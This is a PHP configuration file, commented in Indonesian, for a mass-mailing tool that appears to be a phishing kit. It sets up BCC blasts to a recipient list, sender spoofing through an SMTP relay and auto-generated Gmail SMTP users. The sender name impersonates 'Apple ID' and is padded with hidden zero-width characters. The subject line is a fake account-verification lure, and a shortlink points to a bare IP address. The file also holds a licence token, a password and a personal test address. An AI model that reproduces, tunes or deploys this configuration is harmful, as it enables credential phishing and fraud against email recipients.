<?php
error_reporting(0);
$rand = rand(1,999999);

/*

   ██████╗ ███████╗████████╗██████╗ ██████╗
   ██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗
   ██████╔╝███████╗   ██║   ██████╔╝██║  ██║
   ██╔══██╗╚════██║   ██║   ██╔══██╗██║  ██║
   ██████╔╝███████║   ██║   ██║  ██║██████╔╝
   ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═════╝

========Random (Letter | Subject)=================
[+] [randstring+]    = Uppercase random string
[+] [randstring-]    = Lowercase random string
[+] [randstring=]    = Mixcase random string
[+] [country]        = Random country
[+] [date]           = Random date
[+] [OS]             = Random OS
[+] [browser]        = Random Browser
[+] [number]         = Random Number
[+] [ip]             = Random IP
==============Random (From Mail)===================
[+] [randstring+]    = Uppercase random string
[+] [randstring-]    = Lowercase random string
[+] [randstring=]    = Mixcase random string
[+] [number]         = Random Number
[+] [default]        = Random 16 Digit String
===================================================

*/

$SENDER         = [ 'token'         => 'BSTRD-KG4L7-Q30EB-WWHEP',
                    'debug'         => 'no',               // yes - Untuk melihat status sender secara details   | no - Untuk melihat total email yg terkirim
                    'custom_header' => 'yes',               // yes - Untuk menggunakan Custom Header              | no - Jika Tidak menggunakan Custom Header
                    'spoofing'      => 'no',               // yes - Khusus SMTP External / smtp-relay.google.com | no - Jika Menggunakan smtp.gmail.com
                    'fm_generate'   => 'no-reply.app-[default]99' ];      // From Mail yang digunakan pada saat generate user

$SMTP           = [ 'auto' => 'yes',                         // yes - Jika menggunakan auto generate SMTP User | no - Jika Membuat SMTP user secara Manual
                    'host' => 'smtp.gmail.com',             // Host SMTP
                    'port' =>  '465',                         // Port SMTP
                    'type' =>  'SSL',                       // Tulis Capital Semua
                    'user' => 'user@domain.com',            // From Mail untuk spoofing, hiraukan jika menggunakan smtp.gmail.com
                    'pass' => '4t4efwftgrew4g3t', ];                // Pass Jangan Diganti Apabila Menggunakan Generate User

$USER_MANUAL    = [ 'user@domain.com', ];                   // Isi Jika Ingin Create User Relay Sendiri :D

$SEND           = [ 'type' => 'bcc',                        // bcc - Untuk Mode BCC | to - Untuk Mode TO | cc - Untuk Mode CC
                    'to'   => 'user@domain.com',            // Isi Jika Menggunakan Mode BCC / CC
                    'list' => 'list/list.txt' ];            // Letak List Klean

$MAIL           = [ 'type'      => 'letter',                // null - Tanpa Letter | letter - HTML Letter
                    'from_name' => 'Ap‌pl‌e‌‌ ‌‌I‌D‌‌',             // Nama Pengirim Email
                    'subject'   => 'Re: [Statement Update] Status Updated new identifier with Google Chrome and verified account data on October 27, 2019 [[randstring+]-[number]] [FWD]',
                    'letter'    => 'letter/letter.html',                   // Letak Letter Klean
                    'use_pdf'   => 'no',                                   // yes - Jika Menggunakan Attachment | no - Jika Tidak menggunakan Attachment
                    'pdf'       => 'attachment/attachment.docx',           // Letak Attachment Klean
                    'pdf_name'  => 'DOC-ID#'.$rand.'.docx',                // Nama Attachment Di Email
                    'short'     => 'http://35.192.198.6/82wPbvN', ];  // Taroh Shortlink disini (Khusus HTML Letter)

$TEST           = [ 'enabled'   => 'yes',                                   // yes - Jika ingin test email per 500 email send | no - Untuk menonaktifkan
                    'my_email'  => 'iannoverta12@hotmail.com' ];                 // Ganti Emelmu euy jangan ke Emel Ku

$CUST_HEADER    = array( "X-Sent-To:[email],1,awVTWdfVpFvxLn[default]tDsUMbWzh9TSxvXXDO7AKgtWsraLbBBtg5h0T8izy37YMJHcWyIekENDOAD%2BLaFmnHvzxooM%2B7anS%2FkmCA6SeO5Gw[default]LPb16OSlL8kd8%2FZmq2t%2FJi
",);
?>